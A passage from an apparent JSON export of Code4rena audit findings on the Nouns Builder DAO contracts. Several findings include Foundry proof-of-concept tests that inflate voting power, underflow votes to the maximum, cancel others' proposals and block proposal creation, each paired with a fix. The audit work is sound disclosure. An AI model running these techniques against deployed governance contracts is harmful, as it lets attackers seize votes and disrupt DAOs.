vm.startPrank(zoraDAO);   manager.registerUpgrade(managerImpl0, address(managerImpl));   manager.upgradeTo(managerImpl);   vm.stopPrank(); } ```  Then all tests can be run and they will pass."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/250", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/249", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/247", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/245", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/243", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "`blockhash(block.number)` returns zero, weakening randomness", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/242", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "`blockhash(block.number)` returns zero, weakening randomness"}, {"title": "Try-catch block at `Auction._createAuction()` will only catch string errors", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/240", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L234   # Vulnerability details   The `_createAuction` function wraps the `token.mint()` call in a try-catch block, however this will only catch reverts that comes from the require keyword and not the reverts with custom errors or other kinds of errors (arithmetic over/underflow etc.)  ## Impact In case of an error at the `mint()` function the auction won't be settled till the owner intervenes and pauses the contract.  ## Proof of Concept Here's a test that proves that `catch Error()` doesn't catch custom errors (the test will fail):  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\";  contract ContractTest is Test {     function testErr() public{         Reverter r = new Reverter();         try r.throwCustomError(){          }catch Error(string memory) {          }     } }  contract Reverter{     error  MyErr();      function throwCustomError() public{         revert MyErr();     } }   ```  ## Recommended Mitigation Steps  Remove the `Error` so that it'll catch any kind of revert:  ```diff              // Pause the contract if token minting failed -        } catch Error(string memory) { +        } catch  {              _pause();          }      } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/236", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Ensure non-zero addresses is provided to token's auction house", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/231", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "Ensure non-zero addresses is provided to token's auction house"}, {"title": "`_transferFrom()` can be used to indefinitely increase voting power.", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268   # Vulnerability details  ## `_transferFrom()` can be used to indefinitely increase voting power. ### Impact It is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.  ### Explanation The `_transferFrom()`  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)  ### Code POC ```solidity // Insert this test case into Token.t.sol // Run: forge test --match-contract Token -vv  import \"forge-std/console.sol\"; ... function testIncreaseVotePower() public {         deployMock();          address voter1;         address voter2;         uint256 voter1PK;         uint256 voter2PK;          // Voter with 1 NFT voting power         voter1PK = 0xABC;         voter1 = vm.addr(voter1PK);         vm.deal(voter1, 1 ether);         // Second account created by same voter         voter2PK = 0xABD;         voter2 = vm.addr(voter2PK);    // Giving voter1 their 1 NFT         vm.prank(founder);         auction.unpause();         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(2);         vm.warp(auctionParams.duration + 1 seconds);         auction.settleCurrentAndCreateNewAuction();          // Start Exploit         console.log(\"Initial Votes\");         console.log(\"voter1: \", token.getVotes(voter1));         console.log(\"voter2: \", token.getVotes(voter2));                  vm.prank(voter1);         token.delegate(voter2);         console.log(\"After Delegating Votes, voter1 -> delegate(voter2)\");         console.log(\"voter1: \", token.getVotes(voter1));         console.log(\"voter2: \", token.getVotes(voter2));          vm.prank(voter1);         token.transferFrom(voter1, voter2, 2);          console.log(\"After Token transfer, voter1 -transferFrom()-> voter2\");         console.log(\"voter1 votes: \", token.getVotes(voter1));         console.log(\"voter2 votes: \", token.getVotes(voter2));          vm.prank(voter2);         token.delegate(voter2);         console.log(\"After Delegating Votes, voter2 -> delegate(voter2)\");         console.log(\"voter1: \", token.getVotes(voter1));         console.log(\"voter2: \", token.getVotes(voter2));     } ``` Expected Output: ```solidity [PASS] testVoteDoublePower() (gas: 3544946) Logs:   Initial Votes   voter1:  1   voter2:  0   After Delegating Votes, voter1 -> delegate(voter2)      voter1:  1   voter2:  1   After Token transfer, voter1 -transferFrom()-> voter2   voter1 votes:  0   voter2 votes:  2   After Delegating Votes, voter2 -> delegate(voter2)      voter1:  0   voter2:  3 ``` ### Recommendations Looking at [OpenZeppelin's ERC721Votes](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states: ``` * Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost * on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of * the votes in governance decisions, or they can delegate to themselves to be their own representative. ``` The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated. - I believe the issue is here on this [line](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268) ```solidity // Transfer 1 vote from the sender to the recipient \u00a0 \u00a0 \u00a0 \u00a0 _moveDelegateVotes(_from, _to, 1); ``` Where it should move from the delegate of `_from` to the delegate of `_to`. Suggested FIx: ```solidity \u00a0_moveDelegateVotes(delegation[_from], delegation[_to], 1); ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/223", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/221", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/220", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/217", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/216", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/213", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/212", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/210", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/206", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/204", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Delegation should not be allowed to address(0)", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/203", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ## Impact Assuming an existing bug in the `_delegate` function is fixed (see my previous issue submission titled \"Delegating votes leaves the token owner with votes while giving the delegate additional votes\"): if a user delegates to address(0) that vote gets lost.  ## Proof of Concept  Assuming the `_delegate` function gets patched by changing: `address prevDelegate = delegation[_from];` to `address prevDelegate = delegates(_from);`  The steps to be taken:  1. User (U) gets one NFT (e.g by winning the auction)  a. votes(U) = 1 2. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 0, votes(address(0)) = 0 3. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 2^192 - 1  Below is a forge test showing the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { NounsBuilderTest } from \"../utils/NounsBuilderTest.sol\"; import { TokenTypesV1 } from \"../../src/token/types/TokenTypesV1.sol\";  contract TokenTest is NounsBuilderTest, TokenTypesV1 {     address user1 = address(0x1001);     address delegate1 = address(0x2001);     address delegate2 = address(0x2002);      function setUp() public virtual override {         super.setUp();          vm.label(user1, \"user1\");         vm.label(delegate1, \"delegate1\");         deployMock();     }      function setMockFounderParams() internal virtual override {         address[] memory wallets = new address[](1);         uint256[] memory percents = new uint256[](1);         uint256[] memory vestingEnds = new uint256[](1);          wallets[0] = founder;         percents[0] = 0;         vestingEnds[0] = 4 weeks;          setFounderParams(wallets, percents, vestingEnds);     }      function test_pown2() public {         // user1 gets one token         vm.startPrank(address(auction));         token.mint();         token.transferFrom(address(auction), user1, 0);         vm.stopPrank();          // user1 has 1 token & 1 vote         assertEq(token.balanceOf(user1), 1);         assertEq(token.getVotes(user1), 1);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), 0);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), type(uint192).max);     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Either: 1. Don't allow delegation to address(0) by adding a check or 2. If someone tries to delegate to address(0), delegate to the NFT owner instead"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/200", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/199", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/197", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "`Governor` - Quorum could be less than intended", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/195", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-09-nouns-builder-findings", "body": "`Governor` - Quorum could be less than intended"}, {"title": "A proposal can be cancelled by anyone if the proposal has exactly proposalThreshold votes", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L128 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L363   # Vulnerability details  ## Impact If the proposer of a proposal has votes in the same amount as the proposalThreshold, they can create a proposal. But in this case, anyone can also cancel this proposal.  When creating a proposal the requirement is \"Ensure the caller's voting weight is greater than or equal to the threshold\". When cancelling a proposal the check is: if `getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold` then it the cancelling is not allowed. In effect, if the number of votes is lower than *or equal* to the proposalThreshold it can be cancelled.  In the extreme case where all the DAO members have no more than the proposalThreshold amount of votes, every proposal can be cancelled.  ## Proof of Concept The forge test below demonstrates the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import \"forge-std/console.sol\"; import { NounsBuilderTest } from \"../utils/NounsBuilderTest.sol\";  import { IManager } from \"../../src/manager/IManager.sol\"; import { IGovernor } from \"../../src/governance/governor/IGovernor.sol\"; import { GovernorTypesV1 } from \"../../src/governance/governor/types/GovernorTypesV1.sol\";  contract GovCancelWrongCheckTest is NounsBuilderTest, GovernorTypesV1 {     uint256 internal constant AGAINST = 0;     uint256 internal constant FOR = 1;     uint256 internal constant ABSTAIN = 2;     uint256 proposalThresholdBps = 100;      address internal voter1 = address(0x1234);     address internal randomUser = address(0x8888);      function setUp() public virtual override {         super.setUp();          deployMock();     }      function testCanCancelProposalIfExactThreshold() public {         // mint a few tokens         for (uint256 i; i < 85; i++) {             vm.prank(address(auction));             token.mint();         }         assertEq(token.totalSupply(), 100);          // transfer one token to voter1         vm.prank(address(auction));         token.transferFrom(address(auction), voter1, 5);         assertEq(token.balanceOf(voter1), 1);          // make sure voter has enough votes         assertEq(governor.proposalThreshold(), 1);         assertEq(token.getVotes(voter1), 1);          vm.warp(block.timestamp + 1);          // propose         (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();         vm.prank(voter1);         bytes32 proposalId = governor.propose(targets, values, calldatas, \"test\");          // Proposal created successfully         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Pending));          // Cancel proposal         vm.prank(randomUser);         governor.cancel(proposalId);         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Canceled));     }      function setMockGovParams() internal virtual override {         setGovParams(2 days, 1 seconds, 1 weeks, proposalThresholdBps, 1000);     }      function mockProposal()         internal         view         returns (             address[] memory targets,             uint256[] memory values,             bytes[] memory calldatas         )     {         targets = new address[](1);         values = new uint256[](1);         calldatas = new bytes[](1);          targets[0] = address(auction);         calldatas[0] = abi.encodeWithSignature(\"pause()\");     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Change the check in `cancel` to match the requirement in `propose`; change line 363 in Governor.sol to: `if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) >= proposal.proposalThreshold)` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/192", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Multiple vote checkpoints per block will lead to incorrect vote accounting", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253   # Vulnerability details  Voting power for each NFT owner is persisted within timestamp-dependent checkpoints. Every voting power increase or decrease is recorded. However, the implementation of `ERC721Votes` creates separate checkpoints with the same timestamp for each interaction, even when the interactions happen in the same block/timestamp.  ## Impact  Checkpoints with the same `timestamp` will cause issues within the `ERC721Votes.getPastVotes(..)` function and will return incorrect votes for a given `_timestamp`.  ## Proof of Concept  [lib/token/ERC721Votes.sol#L252-L253](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253)  ```solidity /// @dev Records a checkpoint /// @param _account The account address /// @param _id The checkpoint id /// @param _prevTotalVotes The account's previous voting weight /// @param _newTotalVotes The account's new voting weight function _writeCheckpoint(     address _account,     uint256 _id,     uint256 _prevTotalVotes,     uint256 _newTotalVotes ) private {     // Get the pointer to store the checkpoint     Checkpoint storage checkpoint = checkpoints[_account][_id];      // Record the updated voting weight and current time     checkpoint.votes = uint192(_newTotalVotes);     checkpoint.timestamp = uint64(block.timestamp);      emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes); } ```  **Consider the following example and the votes checkpoint snapshots:**  _Note: Bob owns a smart contract used to interact with the protocol_  **Transaction 0:** Bob's smart contract receives 1 NFT through minting (1 NFT equals 1 vote)  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     |  **Transaction 1:** Bob's smart contract receives one more NFT through minting  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     |  **Transaction 1:** Within the same transaction 1, Bob's smart-contract delegates 2 votes to Alice  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     |  **Transaction 1:** Again within the same transaction 1, Bob's smart contract decides to reverse the delegation and self-delegates  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     | | 3                | 1         | 2     |  **Transaction 1:** Bob's smart contract buys one more NFT  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     | | 3                | 1         | 2     | | 4                | 2         | 3     |  Bob now wants to vote (via his smart contract) on a governance proposal that has been created on `timeCreated = 1` (timestamp 1).  Internally, the `Governor._castVote` function determines the voter's weight by calling `getVotes(_voter, proposal.timeCreated)`.  [governance/governor/Governor.sol#L275](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L275)  ```solidity weight = getVotes(_voter, proposal.timeCreated); ```  `getVotes` calls `ERC721.getPastVotes` internally:  [governance/governor/Governor.sol#L462](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462)  ```solidity function getVotes(address _account, uint256 _timestamp) public view returns (uint256) {     return settings.token.getPastVotes(_account, _timestamp); } ```  `ERC721.getPastVotes(..., 1)` tries to find the checkpoint within the `while` loop:  | # Iteration | `low` | `middle` | `high` | | ----------- | ----- | -------- | ------ | | 0           | 0     | 2        | 4      |  The `middle` checkpoint with index `2` matches the given timestamp `1` and returns `0` votes. This is incorrect, as Bob has 2 votes. Bob is not able to vote properly.  _(Please be aware that this is just one of many examples of how this issue can lead to incorrect vote accounting. In other cases, NFT owners could have more voting power than they are entitled to)_  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider batching multiple checkpoints writes per block/timestamp similar to how NounsDAO records checkpoints. "}, {"title": "Creating a new governance proposal can be prevented by anyone", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377   # Vulnerability details  When creating a new governance proposal, the `proposalId` is generated by hashing the proposal data (`_targets, _values, _calldatas, descriptionHash`). To prevent duplicated proposals, the current `Governor` implementation checks if the `proposalId` exists already. If it exists, the call will revert with the `PROPOSAL_EXISTS` error.  ## Impact  Anyone can prevent others from creating governance proposals by front-running the create proposal transaction with the same data, followed by an immediate call to the `Governor.cancel` function.  This will prevent creating a proposal with the same proposal data. A proposal creator would have to slightly change the proposal to try to create it again (however, it can be prevented again due to the aforementioned issue)  ## Proof of Concept  [governance/governor/Governor.propose](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151)  ```solidity function propose(     address[] memory _targets,     uint256[] memory _values,     bytes[] memory _calldatas,     string memory _description ) external returns (bytes32) {     [..]      // Compute the description hash     bytes32 descriptionHash = keccak256(bytes(_description));      // Compute the proposal id     bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);      // Get the pointer to store the proposal     Proposal storage proposal = proposals[proposalId];      // Ensure the proposal doesn't already exist     if (proposal.voteStart != 0) revert PROPOSAL_EXISTS(proposalId); // @audit-info Reverts in case the proposals with the same data exists already      [..] } ```  [governance/governor/Governor.cancel](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377)  Cancelling a proposal updates the `proposal.canceled` boolean property to `true`. `proposal.voteStart` is left unchanged (`!= 0`).  ```solidity /// @notice Cancels a proposal /// @param _proposalId The proposal id function cancel(bytes32 _proposalId) external {     // Ensure the proposal hasn't been executed     if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();      // Get a copy of the proposal     Proposal memory proposal = proposals[_proposalId];      // Cannot realistically underflow and `getVotes` would revert     unchecked {         // Ensure the caller is the proposer or the proposer's voting weight has dropped below the proposal threshold         if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold)             revert INVALID_CANCEL();     }      // Update the proposal as canceled     proposals[_proposalId].canceled = true;      // If the proposal was queued:     if (settings.treasury.isQueued(_proposalId)) {         // Cancel the proposal         settings.treasury.cancel(_proposalId);     }      emit ProposalCanceled(_proposalId); } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider adding a per-account nonce storage variable (e.g. `mapping(address => uint256) internal proposalCreatorNonces;` to the `Governor` contract and include the `proposalCreatorNonces[msg.sender]++` nonce within the computed proposal id. "}, {"title": "Treasury does not consider grace period for expiring queued proposals", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/178", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "Treasury does not consider grace period for expiring queued proposals"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/176", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/173", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/172", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Set owner from parameter", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/166", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "Set owner from parameter"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/164", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/157", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/156", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "propose() in Governor.sol has no cap on number of _targets input which can lead to a proposal that cannot be executed", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/155", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "propose() in Governor.sol has no cap on number of _targets input which can lead to a proposal that cannot be executed"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/149", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/145", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/140", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/139", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "The storage layout in *StorageV1 may prevent the contract from being upgraded", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/131", "labels": ["bug", "duplicate", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-nouns-builder-findings", "body": "The storage layout in *StorageV1 may prevent the contract from being upgraded"}, {"title": "Lack of event emission after critical initialize() functions", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/129", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "Lack of event emission after critical initialize() functions"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/126", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/125", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/120", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/118", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/117", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "_handleOutgoingTransfer() does not verify that tokens were transferred successfully.", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/115", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "_handleOutgoingTransfer() does not verify that tokens were transferred successfully."}, {"title": "Token: Founder percentages not always respected", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/107", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/debe9b792cc70510eadf9b3728cde5b0f2ec9a1f/src/token/Token.sol#L110   # Vulnerability details  ## Impact Because of the \"greedy\" minting scheme for founders (tokens to founders are minted until `_isForFounder` returns `false`, i.e. until there is an unset `tokenRecipient[tokenId % 100]`), it can happen that the actual percentages of tokens that the founders receive deviate significantly from the desired percentages:  ##  Proof Of Concept Imagine we are in a situation where one founder has a 51% share and the other a 48% share. Because `schedule` is set to 1 for the first founder, `tokenRecipient[0] ... tokenRecipient[50]` will be set to his address. `tokenRecipient[51], tokenRecipient[53], ...` is set to the address of the second founder. Now let's say a mint happens just before the `vestExpiry` and when `tokenId % 100 == 0`. In such a situation, founder 1 will get 51 tokens (because of the consecutive entries in `tokenRecipients`) and founder 2 will get 1 token (because of the entry in `tokenRecipient[51]`, which is also consecutive. Let's say that the next mint happens after the vest expiration, which means that no founders get additional tokens.  In such a situation, founder 1 got 51 of the \"last 100\" token IDs, whereas founder 2 only got 1. Therefore, the overall percentage of tokens that those founders got will not be 51% and 40%. When the vest expiration was set to a time far in the future, it will be close to it, but when the vest timespan was only short, it can be very bad. In the extreme case where the expiration is set such that only 1 mint call causes mints for founders, founder 1 will have 51 tokens and founder 2 only 1, meaning the percentages are 51% / 1% instead of 51% / 48%!  ## Recommended Mitigation Steps Consider using another distribution scheme. Instead of the current \"greedy\" scheme (minting until a slot is free), it would make sense to mint the tokens for the founders every 100 tokens, i.e. everytime when `tokenId % 100 == 0`. Like that, it is ensured that the actual percentages are equal to the desired percentages."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/105", "labels": ["bug", "G (Gas Optimization)"], "target": 